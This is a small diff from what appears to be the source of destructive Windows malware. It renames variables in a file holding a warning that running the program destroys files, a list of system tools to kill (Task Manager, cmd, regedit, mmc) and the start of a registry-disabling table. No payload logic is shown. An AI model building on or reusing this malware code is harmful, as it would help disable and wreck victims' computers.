@@ -12,7 +12,7 @@
 #include "../../Header-Files/pch.h"
 #include "../../Header-Files/(d0t)niX.h"
 
-LPCWSTR lpszWarningMSG = {
+LPCWSTR lpWarningMSG = {
 	L"The Software you're trying to execute is considered Malware !\n\n"
 	L"Running this Malware will result in your Computer being unusable "
 	L"and your Files irreparably damaged/destroyed.\n\n"
@@ -33,13 +33,13 @@ const WCHAR szCharSet[] = {
 };
 const SIZE_T cculCharSet = (sizeof(szCharSet) - 2) / 2;
 
-LPCWSTR lpszKillProcs[] = {
+LPCWSTR lpKillProcs[] = {
 	L"taskmgr.exe",
 	L"cmd.exe",
 	L"regedit.exe",
 	L"mmc.exe"
 };
-const SIZE_T cculKillProcs = sizeof(lpszKillProcs) / sizeof(LPCWSTR);
+const SIZE_T cculKillProcs = sizeof(lpKillProcs) / sizeof(LPCWSTR);
 
 const REGLOAD rlDisableKeys[] = {
 	_REGLOAD()
